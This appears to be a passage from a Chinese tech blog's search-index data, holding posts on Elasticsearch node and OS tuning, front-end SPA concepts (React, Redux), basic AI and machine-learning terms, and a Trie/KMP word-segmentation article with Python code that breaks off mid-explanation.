而指定这个临时的私有目录的路径方法可用通过在运行前提供环境变量$ES_TMPDIR。也可用通过修改Elasticsearch主目录bin/Elasticsearch-env文件，在ES_HOME上一行添加：\n... ES_TMPDIR: /var/es-tmp # 添加 ES_HOME=`dirname \u0026#34;SCRIPT\u0026#34;` ... 禁用交换区 操作系统会尽可能的将内存用于文件系统缓存，因此应用程序的数据可能会被交换到swap区，这可能导致JVM堆数据也被交换到磁盘去，对于Elasticsearch来说，这可能会导致性能和稳定性，这在真正的生产环境中一定要避免的。 而如果运行Elasticsearch的机器仅是用于Elasticsearch服务，那么可用通过在/etc/sysctl.conf中设置vm.swappiness=1，这个值是告诉系统交换内存的权重，值越高，代表希望越积极的使用交换分区，值越低则反之，设置为1的意义在于来告诉系统除仅仅在系统紧急情况下才进行交换。\n文件描述符 在Linux/Unix系统中，一切都是文件。所有文件可以是物理文件、虚拟文件、网络套接字文件，而Elasticsearch需要大量的文件描述符（文件句柄），如每个分片由多个段、与其他节点连接等。所以需要确保Elasticsearch能够有足够多的文件描述符，如果文件描述符不够，可能对于Elasticsearch是灾难性的，而且很有可能造成数据丢失。 在Linux中，可以通过ulimit -a来查看当前用户的限制：\ncore file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited scheduling priority (-e) 0 file size (blocks, -f) unlimited pending signals (-i) 128616 max locked memory (kbytes, -l) 65536 max memory size (kbytes, -m) unlimited open files (-n) 1024 pipe size (512 bytes, -p) 8 POSIX message queues (bytes, -q) 819200 real-time priority (-r) 0 stack size (kbytes, -s) 8192 cpu time (seconds, -t) unlimited max user processes (-u) 128616 virtual memory (kbytes, -v) unlimited file locks (-x) unlimited 其中open files (-n) 1024则是Linux系统限制的当前用户一个进程最大文件描述符有多少，对于Elasticsearch官方介绍，其值应该为65,535或者更高，设置这个值有两种方式。\n第一种：为临时设置，在启动Elasticsearch之前，切换至Root用户，使用ulimit -n 65535，然后切回ES用户启动。\n第二种：为永久设置，在启动Elasticsearch之前，切换至Root用户，修改/etc/security/limits.conf添加内容elastic - nofile 65535，该行内容具体的含义可以看该文件的注释，注释有比较清楚的解释。\n最大文件大小 在Elasticsearch中的段文件和一些log文件会变得越来越大， 如果Elasticsearch受到操作系统的最大文件限制的情况下进行写入操作，则可能导致写入失败。而在Linux环境下，Elasticsearch启动的时候，将检查是否有限制。 查看最大文件大小的限制通过ulimit -a中的file size查看。 如果有相关限制，通过修改修改/etc/security/limits.conf文件，并添加内容elastic - fsize unlimited。\n虚拟内存区域映射数量 Elasticsearch会默认根据操作系统选择最优的虚拟内存映射实现，作用将索引的一部分文件映射Elasticsearch内存当中，以便提供高性能，而每个操作系统对于进程所能映射的虚拟内存区域是有个数限制。默认的操作系统限制太低，可能导致内存不足。而在Linux环境下，Elasticsearch启动的时候，将检查是否具备最低262,144个内存映射区域。 设置这个值可以通过Root用户修改/etc/sysctl.conf，并添加vm.max_map_count=262144。修改完成后再启动前执行sysctl -p命令使其生效。\n最大虚拟内存 Elasticsearch和Lucence通过mmap机制将索引的一部分数据映射到Elasticsearch进程的内存空间来提高性能，而在Linux下启动Elasticsearch的时候，会进行检查Elasticsearch进程是否具备无限地址空间的能力。 查看最大文件大小的限制通过ulimit -a中的virtual memory查看。 如果有相关限制，通过修改修改/etc/security/limits.conf文件，并添加内容elastic - as unlimited。\n线程数量 Elasticsearch使用不同的线程池来执行不同类型的操作，所以要保证Elasticsearch在需要的时候，能够创建新的线程，这个至应该至少为4096，如果低于这个值将启动失败。检查这个至可以通过ulimit -a来查看。\ncore file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited scheduling priority (-e) 0 file size (blocks, -f) unlimited pending signals (-i) 128616 max locked memory (kbytes, -l) 65536 max memory size (kbytes, -m) unlimited open files (-n) 1024 pipe size (512 bytes, -p) 8 POSIX message queues (bytes, -q) 819200 real-time priority (-r) 0 stack size (kbytes, -s) 8192 cpu time (seconds, -t) unlimited max user processes (-u) 128616 # 用户最大线程限制 virtual memory (kbytes, -v) unlimited file locks (-x) unlimited 如果低于这个4096，可以通过修改/etc/security/limits.conf设置指定用户的最大线程数量。如elastic - nproc 4096，或者设置为无限制elastic - nproc unlimited\n集群配置 设置集群名称和节点名称 启动一个Elasticsearch实例，就相当于启动了一个节点。Elasticsearch集群则是多个具有相同cluster.name值的节点组成的，当节点加入或者离开的时候，Elasticsearch集群会自动重新组织。 而节点名称在单节点集群中显得不太重要，而在多节点集群中，有助于标识和快速识别节点，节点名称通过elasticsearch.yml文件的node.name设置。\n网络设置 在未设置网络的情况下，Elasticsearch会默认把elasticsearch.yml中的network.host绑定到环回地址上，即127.0.0.1，这主要的作用是用于在单机上进行测试和开发。 而一旦设置了network.host的值后，Elasticsearch就会假定当前由开发模式转为了生产模式，并且将启动检查过程中的警告转变为了异常。\n发现和集群形成设置 发现和集群形成设置主要指通过elasticsearch.yml文件中配置discovery.seed_hosts和cluster.initial_master_nodes两个参数。其中discovery.seed_hosts需要设置复位主节点条件的候选主节点，用于选举和投票新主节点。而cluster.initial_master_nodes参数则是用于在第一次启动集群的时候，将符合主节点的节点找到，然后引导集群启动。\n引用 JVM优化之压缩普通对象指针（CompressedOops） Important Elasticsearch configuration Elasticsearch 生产环境集群部署最佳实践 File Descriptors ES报错too-many-open-files解决 ES6.x默认store为mmapfs（Linux 64位），mmap性能相关分析 File system storage type User Address Space Limits Elasticsearch 8.X 节点角色划分深入详解 ","permalink":"/posts/elasticsearch-config-node/","summary":"节点配置 配置Java 因为Elasticsearch是Java编写的，所以在使用Elasticsearch之前，需要构建好Java的环境。而Elasticsearch会在每个发行版中包含一个推荐JVM版本。同时官方也推荐使用捆绑的JVM版本。 所以有两种方式来配置JVM：\n使用捆绑JVM 手动安装适配当前Elasticsearch的JVM版本 如果是通过下载解压包，则解压后会在第一层目录中看见一个名为jdk的目录，这个就是自带的推荐JVM，默认情况下，如果环境中没有设置ES_JAVA_HOME在启动的时候，则会直接使用自带的JVM。 如果安装了JVM，但需要使用自带JVM或者使用指定的JVM，则可以找到esdir/bin/Elasticsearch-env文件，然后找到下面的内容：\n# now set the path to java ES_JAVA_HOME=\u0026#34;/home/elastic/Elasticsearch-8.2.0/jdk\u0026#34; # 添加这段内容，路径需要自行修改 if [ ! -z \u0026#34;$ES_JAVA_HOME\u0026#34; ]; then JAVA=\u0026#34;$ES_JAVA_HOME/bin/java\u0026#34; JAVA_TYPE=\u0026#34;ES_JAVA_HOME\u0026#34; Java堆内存配置 Elasticsearch使用Java编写的，所以Java的堆内存越大，Elasticsearch可用的堆内存越多，缓存的数据也就越多。但是过于太大的堆内存，可能是垃圾回收暂停。 除此之外，官方还建议堆内存的大小设置不要超过对象指针（oops）的阈值。不同的系统阈值有所不同，而在大多数系统上26GB是安全，而有些可能可用高达30G。 查看是否超过了oops阈值，可用两种方法。第一种为API：\n_nodes/_all/jvm { ... \u0026#34;using_compressed_ordinary_object_pointers\u0026#34;: \u0026#34;true\u0026#34;, ... } 第二种为检查日志：\n[2022-06-09T06:17:15,837][INFO ][o.e.e.NodeEnvironment ] [xxx-p1] heap size [28gb], compressed ordinary object pointers [true] 设置堆内存大小通过设置Elasticsearch配置文件中的jvm.options文件，但在生产环境中尽量不要使用该文件直接修改，而是在java.options.d目录中新添加一个后缀为.options的文件。 配置文件中通过-Xms和-Xmx来设置最小和最大的堆内存：\nesdir/config/jvm.options.d/heap.options -Xms16g -Xmx16g 官方建议将该值设置为一致的，并且该值应该小于物理内存的50%。因为除了堆内存，JVM本身也需要一定的内存，除此之外，Elasticsearch底层使用的Lucence，Lucence段存放在单独的文件中，而OS会将部分常用段进行缓存（热段），便于加快应用的访问性能，所以没有足够的内存给OS进行缓存，那么同样会降低Elasticsearch的性能。 下面是因为堆内存设置过大，导致JVM内存不够的报错：\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: starting java failed with [1] output: # # There is insufficient memory for the Java Runtime Environment to continue.","title":"Elasticsearch节点配置"},{"content":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。\n","permalink":"/posts/frontend-terms/","summary":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。","title":"前端的技术栈理解"},{"content":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","permalink":"/posts/inteliigence-terms/","summary":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","title":"人工智能基础名词理解"},{"content":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self._children # 同样设置一个child变量，用于控制当前的字符对象 for char in word: child = child.get(char) if child is None : # 只要其中一个没有查找到，那么说明匹配识别，则返回False return False return child[\u0026#39;__value\u0026#39;] # 如果没有匹配失败则返回特殊__value的值 #回True表示词典中存在该词，返回False表示不存在或者传递进来的词不成词 将Trie实现后，就可以在正向或者反向等算法中来进行使用，从而提高运算的效率，但是使用Trie树的时候，可能无法动态的计算其词的长度，所以根据上一篇文章当中修改的最大正向匹配算法的长度计算我手动计算填写。 下面的代码是基于《[一]漫话中文分词：最大匹配,双向最大,最小词数》文章中的最大正向匹配算法，但其中的词典则是使用Trie结构，改动了两处：\ntrie = Trie() trie._add_word(\u0026#39;分词\u0026#39;) sentence = \u0026#39;中文分词算法\u0026#39; start = 0 maxWidth = 2 # 改动1：手动填写最大长度 cut_result = [] while (start \u0026lt;= len(sentence)): end = start + maxWidth word = sentence[start: end] while ( word ) : if ( trie._get_word(word) ) : # 改动2：利用Trie的查询函数，该返回查询到为词则返回True，否则False cut_result.append(word) start = start + len(word) - 1 break if (len(word[:-1]) == 0): cut_result.append(word) break word = word[:-1] start = start + 1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] KMP算法 高效的数据结构有了，然而还可以更近一步，在Trie结构的基础上采用一些高效的查询算法，比如下面的AC自动机，在了解AC自动机之前，可以先了解一下KMP算法，虽然了解AC自动机不需要了解KMP算法就可以理解，但是理解了KMP算法过后，实际上会更容易理解AC自动机。 KMP算法于1977年由James H. Morris](https://en.wikipedia.org/wiki/James_H._Morris)、Donald Knuth、Vaughan Pratt三位发明者联合发表，其算法名称KMP是由三位发明者首字母命名。 KMP算法其核心主要为利用已匹配字符串中的已知信息来减少无效匹配的次数，从而提升查找的效率。首先可以来看看普通查找方式，找到一个字符串在另外一个字符串中出现的位置该怎么来匹配。 比如搜索词ABABC，需要查找在文本ABABABC中出现的位置，那么按照常规的方式应该首先第一个字符，是否相等：\n如果第一个字符相等，那么继续匹配第二个字符，查看第二个字符是否相等：\n如果第二字符相等再匹配下一个字符是否相等，一直匹配，直到第五个字符出现了问题，不相等：\n此时，将搜索词的位置往后移动一位，即搜索词的第一个字符从文本的第二个字符开始匹配：\n移动过后，第一位不匹配，那么继续将模式串移动一位，将模式串第一个字符对准字符串第三个字符，继续重新匹配，第一次匹配：\n第一次匹配成功，继续第二位，第三位匹配，一直遍历匹配到搜索词最后一个字符成功，那么整个搜索结束，并返回该搜索词第一次出现的位置为文本的第三位。\n从上面的例子来看，第二次明显属于无效匹配，如果在大量的文本中搜索词的话，会造成更多这样的无效匹配出现，而KMP算法就是解决这样的问题，用来减少无效的匹配次数，从而来增加匹配的效率。 KMP算法首先需要维护一个特殊的表，名字为部分匹配表或者失配函数，这个表由非负数数值构成，并且搜索词的字符都会对应一个数值，大概为下面这样：\n关于这个值是如何计算的先不用管，先看看如何使用这个值来跳过无效的匹配，还是拿刚刚例子，搜索词ABABC，文本ABABABC，首先进行第一次匹配：\n第一次匹配成功，进入第二次匹配：\n第二次匹配成功，重复该动作，直到匹配到第五次出现了问题，此时搜索词第五位的C和文本的第五位A不相等，此时KMP算法中的部分匹配表就派上了用场，可以通过该表计算出需要搜索词下一个开始匹配的位置是从什么地方开始，这样就可以跳过无效匹配位的值。其计算公式为：\n位移值 = 成功匹配的数量 - 匹配失败位前一位在部分匹配表中的值 